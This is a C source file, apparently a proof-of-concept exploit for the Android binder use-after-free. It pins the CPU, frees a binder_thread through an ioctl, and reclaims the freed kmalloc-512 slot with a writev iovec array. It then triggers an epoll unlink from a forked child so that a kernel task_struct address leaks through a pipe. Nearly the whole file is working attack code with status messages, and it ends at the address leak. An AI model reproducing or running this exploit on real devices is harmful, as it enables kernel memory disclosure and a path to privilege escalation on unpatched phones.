#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sched.h>
#include <wait.h>
#include <string.h>

#define BINDER_THREAD_EXIT 0x40046208UL
#define PAGESZ 0x1000
#define IOVEC_COUNT 25

void bind_cpu(void){
	int ret;
	cpu_set_t cpu_set;
	CPU_ZERO(&cpu_set);
	CPU_SET(0, &cpu_set);
	
	ret = sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set);
		
	if (ret < 0){
		fprintf(stderr, "[!] cpu_bind failed!\n");
		_exit(-1);
	}
	
	fprintf(stderr, "[+] Binding CPU to 0 core!\n");
}


void *mmap_page(void){
	void *mem = mmap((void *) 0x100000000UL, PAGESZ, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
	if (mem == (void *)-1){
		fprintf(stderr, "[-] mmap_error()!\n");
		_exit(-1);
	}
	
	fprintf(stdout, "[+] mmap'd address: %p\n", mem);
	return mem;
}

void leak_task_struct(int fd, int epfd, struct epoll_event event){
	int pipefd[2] = {0};
	ssize_t readsz = 0x0;
	char buffer[PAGESZ] = {0};
	int offset = 10;
	pid_t cpid; //child process id 
	
	struct iovec iovec_stack[IOVEC_COUNT];
	memset(iovec_stack, 0, sizeof(iovec_stack));
		
	void *aligned_address = mmap_page();
	
	fprintf(stderr, "[+] Setting up pipe\n");
	
	//pipefd[0] read_fd
	//pipefd[1] write_fd

	if (pipe(pipefd) < 0){
		perror("pipe()\n");
		_exit(-1);
	}		
	
	fprintf(stderr, "[+] Pipe creation was a success!\n");
	
	
	//reducing the size of the pipe from 0xffff to 0x100;	
	if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGESZ) < 0){
		perror("fcnlt(): pipe_change_size\n");
		_exit(-1);
	}
	
	fprintf(stdout, "[+] pipe-size updated: 0x%x\n", PAGESZ);
	fprintf(stdout, "[+] Setting up iovecs\n");


	iovec_stack[offset].iov_base = aligned_address; //spinlock
	iovec_stack[offset].iov_len = PAGESZ; //max size of a pipe
	iovec_stack[offset + 1].iov_base = (void *) aligned_address; //This will be clobbered with a kernel address binder_buffer->0xa
	iovec_stack[offset + 1].iov_len = PAGESZ; //The No of bytes to read from the above address
	
	fprintf(stdout, "[+] Linking binder_thread to epollevent wait_queue!\n");	
	//link the eventpoll to the binder_thread
	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
	
	fprintf(stdout, "[+] Initiating a fork!\n");
	
	
	//create a child process	
	cpid = fork();
	if (cpid < 0){
		perror("fork()\n");
		_exit(-1);
	}
	
		
	//The child-process
	if (cpid == 0){
		sleep(3); //allow execution of the parent process to start
		//trigger the unlink operation to clobber the iovec_stack
		fprintf(stderr, "[*] Child Process:\n");
		fprintf(stderr, "\t[+] unlinking re-allocated binder_thread!\n");		

		epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);
		
		fprintf(stderr, "\t[+] unblocking writev to leak task_struct!\n");
		//read data from the pipe to unblock the parent writev
		ssize_t readsz = read(pipefd[0], buffer, sizeof(buffer));
	
		if (readsz != PAGESZ)
			_exit(-1);
		
		close(pipefd[1]);
		fprintf(stderr, "\t[+] read: 0x%lx bytes!\n", readsz);

		_exit(0);
		
	}

	fprintf(stderr, "[*] Parent process:\n");
	fprintf(stderr, "\t[+] creating a hole in kmalloc-512\n");
	//getchar();

	//The parent-process
	ioctl(fd, BINDER_THREAD_EXIT, NULL); //free the binder_thread to create a hole in kmalloc-512
	
	fprintf(stderr, "\t[+] re-allocting binder_thread!\n");
	//getchar();
	//allocate iovects to fill the hole in kmalloc-512 via writev and blocks waiting for the child process to unblock
	ssize_t writesz = writev(pipefd[1], iovec_stack, IOVEC_COUNT);
	

	if (writesz < 0){
		perror("writesz()");
		_exit(-1);
	}
	
	if (writesz != PAGESZ *2){
		fprintf(stderr, "[-] writesz read 0x%lx\n", writesz);
		_exit(-1);
	}


	fprintf(stderr, "[+] waiting for the child process!\n");
	waitpid(cpid, NULL, -1);

	//clear the buffer that the child process wrote to
	memset(buffer, 0, sizeof(buffer));
	//The iovec_struct has now been overwritten with a Kernel address
	fprintf(stderr, "[+] Leaking task_struct!\n");
	
	readsz = read(pipefd[0], buffer, sizeof(buffer));
	
	if (readsz != PAGESZ){
		fprintf(stderr, "[!] Read failed. readsz: 0%lxn!\n", readsz);
		_exit(-1);
	}
	
	fprintf(stderr, "[+] read_sz: 0x%lx\n", readsz);
	
	unsigned long ffs = *(unsigned long*)(buffer + 0xe8);	
	fprintf(stderr, "[+] Task-struct 0x%lx\n", ffs);
	
}


int main(){
	struct epoll_event event = {.events = EPOLLIN};
	
	bind_cpu();
	
	int fd = open("/dev/binder", O_RDONLY);
	
	if(fd < 0){
		fprintf(stdout, "[-] Could not open /dev/binder\n");
		_exit(-1);
	}

	fprintf(stdout, "[+] open'd /dev/binder for O_RDONLY!\n");	
	int epfd = epoll_create(1000);
	
	
	//trigger the function to leak a kerne adress
	leak_task_struct(fd, epfd, event);
		
	return 0;
}
